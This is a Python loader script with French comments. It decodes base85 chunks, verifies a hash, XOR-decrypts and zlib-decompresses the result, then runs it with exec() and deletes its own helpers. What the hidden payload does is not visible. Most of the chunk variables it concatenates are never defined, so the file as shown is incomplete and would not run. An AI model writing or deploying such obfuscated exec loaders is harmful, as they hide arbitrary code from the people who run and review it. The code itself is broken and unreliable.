_cgP806bt8WAHpA = 'O4D<JPR&pmHm=FwImhWR*Bodhke|y!6#_IaEQ0t9bk}}TaQLySA$w'
_cu2YhL9Nhx48yN = '9a9KZ3<7gIA249530tn_!1kypinP3%b}eViEmN7coH`v3_blh;`sL'
_cj1hDgHpIQSPL1 = 'n$gKay;C@gM&qMG*smiUxK`m;Z5cYf4QF0Ail=KuqhO7z$U)mnrYK'
_cn0Cb4TlIeOpRp = 'dP&>xu75)j9_gLld@2~_!Yf?s=J~90=vp|x~W3t4XA^Vox$a7B|o?'
_coclMkgDQiKW1t = 'D`bF?$yi%ClcdB+X&!l+yX*m0+FgA}2@+%s(E@RWXc~3sloi@;IGo'
_clkUuKGwmcZhw0 = '_0TmFd3-8#l;qMMjNMvr{g`G}O-j`|RJ<Zkc@?6#i|(|Eb&s5SV!x'
_ccjA1Gsussqau3 = 'Czd$rx>?t@Hc-z*R_QnCjW!edLAVhI2ohUc#`ZO4rk__otecV=Vt?'
_ctZotZzzNlhTep = '3FTUorgn~HTVl~%4}ZOFuYp9Q+}QJTwM4k*&h'

_polHQ38aZjsRI2 = __import__('base64').b85decode(_chiEj6jMZRZSWp + _c_P5WPskIxmn5m + _cyChkmiJjDbgCq + _cr57YTqBpXMt7M + _cu9o4YbBXlBS_I + _cad7UuNJugeOAt + _ctC9U6RRR_5Gaz + _caSw5ycAd4ETWo + _cv8cPnPeDPph2R + _chNYCYHj3GbYJe + _cu6uQEe3qvSDlI + _coBuTRoJ0lOZIv + _cajFcPt1ByjJWm + _czxXdVPeba3y_b + _cq7RBuzP9Of1VM + _cclJ_KoabG1SWy + _ceoWOAOC4NJdpu + _crEimWi6JWPeo7 + _cmf5nLgf5CpdZT + _ciLO8uopqihytQ + _coZ7_ErlEBDvhg + _cuSIuq7q2Biu4f + _c_Inx5BpKXEnMt + _cfYqln0Wi828AK + _cadfOEomNk0R4x + _cazfxh1Ls33i6F + _cyFeCN0ylPlVFn + _cncVGeCGBYQwWp + _cgqKnRfL3Lj0NX + _cyXFPP8YZvWoRB + _c_aeI2nhCOKWfv + _ccb_38fNagCc_N + _clJDsarg0Wf1_F + _czKjS6zg2bC5uc + _clVWx4fWYE42B_ + _ciWNVxU5ACVFhY + _cvR5t_bs7R2Ir0 + _ctuY63X6q2adML + _ckdnn_xLcS3FW4 + _ctaPNFaaofZWJ2 + _cjcAWwF2QzN_aR + _cat18mwwjUd9iT + _co1NhAxZ_ASJrn + _cgdmtuRYALOaLW + _crGNqa2_eXjG24 + _cjsSMiJGFSCZ_C + _cs1ipZ3TUFMzt1 + _cjpoiAxJ6svlye + _cjbNr_9ciisjb1 + _cxqrKNrLl5fWYk + _cnp0oRmm4Ygy40 + _cq6exSvRnPicd1 + _csHEQdVpQO3ImV + _cpPQVvHHwrUEMZ + _cohnsNhdoJipw2 + _cdi4S6RVfsfS6b + _chOVpmLoteR9v6 + _coi093mSeYjILm + _cvf8tQtoA2Gpsk + _clwx6ziuGnYkt6 + _cfivuL9MtdutTl + _cyplkpRzlnEfhG + _cvBKjCay5yGWYG + _cdQYO5iObJyjlw + _ctza6_i3O_PuZ2 + _cfdCSCgOMWcJUH + _cm4XUljv0E1KyV + _cxVzFEaiIjJiy9 + _cxyiOtcqoLTQGT + _chMHDWGrpf9qoo + _cbin5KsFx38ywL + _cbBP5u1PtUnCGe + _ckCyQB6LRmYFir + _cqkqPI3HZb9Vws + _ck6ZJeVCd2kccC + _ctyZm4NWlrfwjw + _c_yxX0tgkocFSL + _cemGyqp8ZkSnIL + _cy9OF5DXENynzn + _ccW5Hbtf6gGLdr + _cqoHsHZAIWYyjs + _cgTLf2FTqwCjkr + _c_tANIAjgExiwn + _cmb9wbSvELQgBO + _cubNOR2JSLGsQE + _crM1UpIc4b0eP4 + _cluoZSGgmzSQdA + _cncXJyGUOZt6Gm + _chk_Y1dutdZMw6 + _cr03HrKuuXnZLB + _cp7nlVBXpsEXmQ + _cxq7Lhk77cB4YB + _cuRx5YLK87ir7P + _c_T4wfgFn99Esj + _ckVp0mp7Dccsbx + _csospONLK288Yy + _cl8ys6mPcYWxq0 + _chNIWAFpFo94Gy + _cpxhZcw94zIBFF + _ckMatwjc8UCyDu + _cpahjzJPzdT5EL + _cfndBcTwGI7DDI + _co7HqtMKh8BG9j + _cluP76cwy02WEZ + _ctbjfVByyiOavG + _cid_QxdabstsVu + _cj_OGRIGfklfzD + _ckdaA0k3IIHMsw + _cdgjivIB8Zdcri + _cvEOyxi5iTrjLY + _crC0cUe9T_ifOZ + _cfXUJBMtVRB4Xi + _cdt4nQ8brUZYvZ + _coRoOWsTSbQLH1 + _c_cUKscKm7TZGA + _ceNoXWk4CJjySj + _cmiBsTov4KzeQn + _cfKalxdx1zRySJ + _cnuaUHGCPELwpK + _cxlpU2oeFnytw5 + _caOhuF70D9pN0F + _ciDdRFj8yjdxXF + _cteqoQithhuYe4 + _czIfymKjOlniIi + _crP9O6xQZMsywq + _ciaj24wF7AbUjl + _cb8AtJ2crArjKE + _cwWLhtQ_H3pJYh + _cqQwnBmSFuEPfm + _cv0icMuM9cVFb_ + _cerZ05MD0Xma_l + _clvhLz6x77CW2I + _czRXzXbY7e0C96 + _coVyeMv_HtVxOw + _cgCuBa3BqzGbTg + _cv3y5aDIc5h9ce + _cryjEC3IyxIN8K + _ctQWMLEuHfGG8f + _cr5k1ZcB6tz_db + _crkXTQ_OSCFCQU + _coiImt1EP5T5lL + _cgCBFhpRPGRmJg + _ccIjFB_iBOWyiT + _cy6oFxrGe5RbIU + _clEqPQ0CteJv07 + _cgfafaiVkPss7b + _cgycN76brm30_h + _crP5vh8DxJGYfd + _cdMPWACQF_FrBw + _chizI8EVHN3RiG + _cz2_A82gOmL00C + _chUYI7hNl5ea0J + _cp4e7OfYGhVIHU + _crL8Hw0ix7S7M1 + _ctg3gAfkXAGlL6 + _cgwdLVUgfnNFiU + _crpvGwHK1OwPD6 + _cnXaY49YExrXFf + _ceX1JjTm76fVI1 + _cygurGZixjElgb + _chOAFRSaVZ_enZ + _cznjLneQhknNEY + _cslPbaCSuVShpF + _cyEbjpEJrfTyUU + _ckBHJyg4NG3jwq + _cgX1Llpam9_2wc + _cil___Gs2O1yD2 + _csadyan8RUJeUc + _cki4ku7gM9qLJu + _czhMxAhGIshtvr + _chUtN7jQHHJqvT + _ccrnc38kVczkxH + _cn7pQbNPjElw39 + _cgjs6vNtf3NqHH + _cxGr9bEhZ_fa_F + _cr0Q2nyukI6TTl + _cxqYxsgGuXl116 + _ccXCjr_4D86wsU + _cv3hBC4JzYlnHS + _crTCuCLNWKebFJ + _cq1RxCds9pmDvN + _cvErltcom1_PXX + _cv0O6EU2o_Jg8f + _cuE75_ZhuGWgpo + _cz8I77pOL8QWMl + _ce47GBTpOfPHsR + _cekl1iv1D0U9gQ + _cvB8XbTe5G_77i + _cdCVWym_IyFsuh + _clrzQYgr4vZls2 + _camj_b6bwUzZc3 + _ccD9q68wvUT6CF + _cgE2EoOPh4sBLd + _coVdDjkNzYICD_ + _cpKHGo2FpowSQh + _c_NzeXj1oi5Pde + _cxCRPKGon5Puqs + _cjSV58BhDmyQa4 + _cfrZFHrpEBQTRb + _czZSsKwkjorG9m + _cgP806bt8WAHpA + _cu2YhL9Nhx48yN + _cj1hDgHpIQSPL1 + _cn0Cb4TlIeOpRp + _coclMkgDQiKW1t + _clkUuKGwmcZhw0 + _ccjA1Gsussqau3 + _ctZotZzzNlhTep)
if __import__('hashlib').sha256(_polHQ38aZjsRI2).hexdigest() != '8d93f3d45ba2b09d401924e19725f20ab091a2c9546f0ca0472e12e2ee6deca4':
    __import__('sys').exit(1)
_xpCcjESVVh6pJL = bytes([201, 162, 99, 125, 12, 113, 202, 155, 40, 244, 151, 207, 168, 45, 235, 171, 217, 158, 176, 253, 234])
_fkbEQu6EuxetQDn = bytes([45, 159, 155, 96, 224, 11, 29, 36, 233, 118, 41, 46, 70, 135, 102, 30, 183, 203, 47, 123, 48])

def _fxuYOg_qrEzKYpL(_b_CBTJZ0LFHEV_, _ktBxLQRNfi9a0t):
    return bytes(_b_CBTJZ0LFHEV_[_ihdHq5rIwYhBCa] ^ _ktBxLQRNfi9a0t[_ihdHq5rIwYhBCa % len(_ktBxLQRNfi9a0t)] for _ihdHq5rIwYhBCa in range(len(_b_CBTJZ0LFHEV_)))

def _fdvmhC_Jt73Suwt(_tjGeZQTQFLRJFC):
    import zlib
    return zlib.decompress(_tjGeZQTQFLRJFC) # Un seul niveau de zlib ici pour simplifier

def _feguJFEC_ZgQsUx():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xkKZcSdjyASofq = _fxuYOg_qrEzKYpL(_polHQ38aZjsRI2, _xpCcjESVVh6pJL)
    # 2. Décompression Zlib
    _dhrTQYFUgTMSJ6 = _fdvmhC_Jt73Suwt(_xkKZcSdjyASofq)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dhrTQYFUgTMSJ6.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ndzB2858Gi4NEc = _main.__dict__
    _ndzB2858Gi4NEc.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ndzB2858Gi4NEc)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feguJFEC_ZgQsUx()
try:
    del _fxuYOg_qrEzKYpL, _fdvmhC_Jt73Suwt, _feguJFEC_ZgQsUx
    del _polHQ38aZjsRI2, _xpCcjESVVh6pJL, _fkbEQu6EuxetQDn
except:
    pass
